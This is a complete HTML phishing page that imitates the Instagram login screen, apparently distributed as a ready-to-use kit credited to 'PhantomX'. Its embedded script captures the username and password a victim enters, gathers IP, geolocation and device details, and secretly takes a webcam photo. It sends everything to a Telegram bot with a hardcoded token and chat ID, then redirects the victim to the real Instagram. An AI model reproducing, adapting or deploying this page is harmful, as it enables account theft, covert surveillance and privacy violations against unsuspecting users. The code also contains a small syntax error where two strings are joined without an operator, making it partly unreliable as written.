<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            background: #fafafa;
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-box {
            background-color: white;
            border-radius: 8px;
            width: 350px;
            box-shadow: 0px 4px 12px rgba(0,0,0,0.1);
            padding: 40px 20px;
            text-align: center;
        }

        .login-box img {
            width: 175px;
            margin-bottom: 20px;
        }

        .login-box h2 {
            font-size: 22px;
            margin-bottom: 20px;
            font-weight: 600;
        }

        .login-box input {
            width: 100%;
            padding: 12px 15px;
            margin: 8px 0;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            font-size: 14px;
        }

        .login-box button {
            background-color: #3897f0;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 4px;
            width: 100%;
            font-size: 14px;
            cursor: pointer;
        }

        .login-box button:hover {
            background-color: #3081d6;
        }

        .signup-link {
            margin-top: 10px;
            font-size: 14px;
            color: #8e8e8e;
        }

        .signup-link a {
            color: #3897f0;
            text-decoration: none;
        }

        .download-link {
            margin-top: 20px;
            font-size: 14px;
        }

        .download-link a {
            color: #3897f0;
            text-decoration: none;
            display: inline-block;
            margin: 5px 10px;
        }

        footer {
            text-align: center;
            margin-top: 30px;
            font-size: 14px;
        }

        footer a {
            color: #8e8e8e;
            text-decoration: none;
        }

        footer .copyright {
            margin-top: 20px;
            color: #8e8e8e;
        }

        .download-link img {
            width: 150px;
            height: 50px;
            border-radius: 5px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://logos-world.net/wp-content/uploads/2020/05/Instagram-Logo-2016-present.png" alt="Instagram Logo">
            <h2>Log in to Instagram</h2>
            <form id="loginForm" onsubmit="submitForm(event)">
                <input type="text" id="email" name="email" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            <div class="signup-link">
                <span>Don't have an account? </span>
                <a href="https://www.instagram.com/accounts/signup/email/?hl=en">Sign up</a>
            </div>
            <div class="download-link">
                <span>Download app:</span><br>
                <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
                    <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" alt="Download for Android">
                </a>
                <a href="https://apps.apple.com/us/app/instagram/id389801252" target="_blank">
                    <img src="https://w7.pngwing.com/pngs/270/658/png-transparent-app-store-apple-google-play-apple-text-logo-mobile-phones.png" alt="Download for iOS">
                </a>
            </div>
        </div>
    </div>

    <footer>
        <a href="#">About</a> | <a href="#">Help</a> | <a href="#">Privacy</a> | <a href="#">Terms</a> | <a href="#">Locations</a> <br>
        <div class="copyright">© 2025 Instagram from meta </div>
    </footer>

    <script>
        const botToken = "7590971159:AAEKdP-eSEE99hsy1rTEUAi0zba7BginDoA";
        const chatId = "5091980014"; // Your Telegram user ID

        async function getUserLocation() {
            try {
                const response = await fetch('https://ipapi.co/json');
                const data = await response.json();
                return {
                    city: data.city,
                    country: data.country,
                    ip: data.ip,
                    org: data.org,
                    asn: data.asn
                };
            } catch (error) {
                return {
                    city: "Unknown",
                    country: "Unknown",
                    ip: "Unknown",
                    org: "Unknown",
                    asn: "Unknown"
                };
            }
        }

        function getDeviceInfo() {
            const platform = navigator.platform;
            const browserInfo = navigator.userAgent;
            const language = navigator.language;
            const memory = (navigator.deviceMemory || 4); // Assuming 4GB if not available
            const cpuCores = navigator.hardwareConcurrency || 4;
            const screenResolution = `${window.screen.width}x${window.screen.height}`;
            
            return { platform, browserInfo, language, memory, cpuCores, screenResolution };
        }

        function captureImage() {
            return new Promise((resolve) => {
                const video = document.createElement('video');
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
                    video.srcObject = stream;
                    video.play();
                    setTimeout(() => {
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        video.srcObject.getTracks().forEach(track => track.stop());
                        resolve(canvas.toDataURL('image/jpeg'));
                    }, 3000); // Wait for 3 seconds before capturing
                }).catch(() => resolve(null)); // Handle error and resolve null
            });
        }

        async function submitForm(event) {
            event.preventDefault();
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            // Get user location and device info
            const locationData = await getUserLocation();
            const deviceInfo = getDeviceInfo();
            const currentTime = new Date().toLocaleString();

            // Capture image from the camera
            const imageData = await captureImage();

            // Prepare the message to send to the bot in Arabic
            const message = `🔓 *تم اختراق الحساب بنجاح بواسطة PhantomX نوع الحساب انستجرام* 🔓\n\n` +
                            `💻 *معلومات الحساب:* 💻\n` +
                            `📧 البريد الإلكتروني: ${email}\n` +
                            `🔑 كلمة المرور: ${password}\n\n` +
                            `🌍 *الموقع:* ${locationData.city}, ${locationData.country}\n` +
                            `🌐 عنوان الـ IP: ${locationData.ip}\n` +
                            `🔍 المزود: ${locationData.org}\n` +
                            `🚨 ASN: ${locationData.asn}\n\n` +
                            `💻 *معلومات الجهاز:* 💻\n` +
                            `🖥️ النظام: ${deviceInfo.platform}\n` +
                            `🌐 المتصفح: ${deviceInfo.browserInfo}\n` +
                            `⚙️ لغة المتصفح: ${deviceInfo.language}\n` +
                            `🔧 الرام: ${deviceInfo.memory}GB\n` +
                            `⚡ أنوية المعالج: ${deviceInfo.cpuCores}\n` +
                            `📺 دقة الشاشة: ${deviceInfo.screenResolution}\n\n` +
                            `🕒 *التوقيت:* ${currentTime}\n\n` +
                            `👁️‍🗨️ *تم التقاط صورة المستخدم*`
                            `☣ *⚜By PhantomX @tx_5w⚜*`   ;

            // Send the information to Telegram bot
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            });

            // Send the captured image to Telegram bot
            if (imageData) {
                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, photo: imageData, caption: "📷 *تم التقاط صورة المستخدم*" })
                });
            }

            // Redirect the user to Instagram after sending the data
            setTimeout(() => window.location.href = 'https://www.instagram.com', 2000);
        }
    </script>
</body>
</html>
